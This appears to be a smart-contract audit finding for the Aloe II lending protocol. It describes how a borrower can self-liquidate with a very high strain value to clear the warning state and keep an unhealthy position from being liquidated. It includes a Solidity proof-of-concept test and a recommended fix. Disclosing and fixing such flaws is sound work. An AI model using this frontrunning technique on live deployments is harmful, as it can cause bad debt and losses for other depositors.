Loud Cloud Salamander

high

# It is possible to frontrun liquidations with self liquidation with high strain value to clear warning and keep unhealthy positions from liquidation
## Summary

Account liquidation involving asset swaps requires warning the account first via `warn`. Liquidation can only happen `LIQUIDATION_GRACE_PERIOD` (2 minutes) after the warning. The problem is that any liquidation clears the warning state, including partial liquidations even with very high strain value. This makes it possible to frontrun any liquidation (or just submit transactions as soon as LIQUIDATION_GRACE_PERIOD expires) by self-liquidating with very high strain amount (which basically keeps position unchanged and still unhealthy). This clears the warning state and allows account to be unliquidatable for 2 more minutes, basically preventing (DOS'ing) liquidators from performing their job.

Malicious user can open a huge borrow position with minimum margin and can keep frontrunning liquidations this way, basically allowing unhealthy position remain active forever. This can easily lead to position going into bad debt and causing loss of funds for the other protocol users (as they will not be able to withdraw all their funds due to account's bad debt).

## Vulnerability Detail

`Borrower.warn` sets the time when the liquidation (involving swap) can happen:
```solidity
slot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);
```

But `Borrower.liquidation` clears the warning regardless of whether account is healthy or not after the repayment:
```solidity
_repay(repayable0, repayable1);
slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;
```

## Impact

Very important protocol function (liquidation) can be DOS'ed and make the unhealthy accounts avoid liquidations for a very long time. Malicious users can thus open huge risky positions which will then go into bad debt causing loss of funds for all protocol users as they will not be able to withdraw their funds and can cause a bank run - first users will be able to withdraw, but later users won't be able to withdraw as protocol won't have enough funds for this.

## Proof of concept

The scenario above is demonstrated in the test, add this to Liquidator.t.sol:
```solidity
function test_liquidationFrontrun() public {
    uint256 margin0 = 1595e18;
    uint256 margin1 = 0;
    uint256 borrows0 = 0;
    uint256 borrows1 = 1e18 * 100;

    // Extra due to rounding up in liabilities
    margin0 += 1;

    deal(address(asset0), address(account), margin0);
    deal(address(asset1), address(account), margin1);

    bytes memory data = abi.encode(Action.BORROW, borrows0, borrows1);
    account.modify(this, data, (1 << 32));

    assertEq(lender0.borrowBalance(address(account)), borrows0);
    assertEq(lender1.borrowBalance(address(account)), borrows1);
    assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);
    assertEq(asset1.balanceOf(address(account)), borrows1 + margin1);

    _setInterest(lender0, 10100);
    _setInterest(lender1, 10100);

    account.warn((1 << 32));

    uint40 unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, block.timestamp + LIQUIDATION_GRACE_PERIOD);

    skip(LIQUIDATION_GRACE_PERIOD + 1);

    // listen for liquidation, or be the 1st in the block when warning is cleared
    // liquidate with very high strain, basically keeping the position, but clearing the warning
    account.liquidate(this, bytes(""), 1e10, (1 << 32));

    unleashLiquidationTime = uint40((account.slot0() >> 208) % (1 << 40));
    assertEq(unleashLiquidationTime, 0);

    // the liquidation command we've frontrun will now revert (due to warning not set: "Aloe: grace")
    vm.expectRevert();
    account.liquidate(this, bytes(""), 1, (1 << 32));
}
```

## Code Snippet

`Borrower.warn` sets the liquidation timer:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L171

`Borrower.liquidate` clears it regardless of strain:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L281

This makes **any** liquidation (even the one which doesn't affect assets much due to high strain amount) clear the warning.

## Tool used

Manual Review

## Recommendation

Consider clearing "warn" status only if account is healthy after liquidation.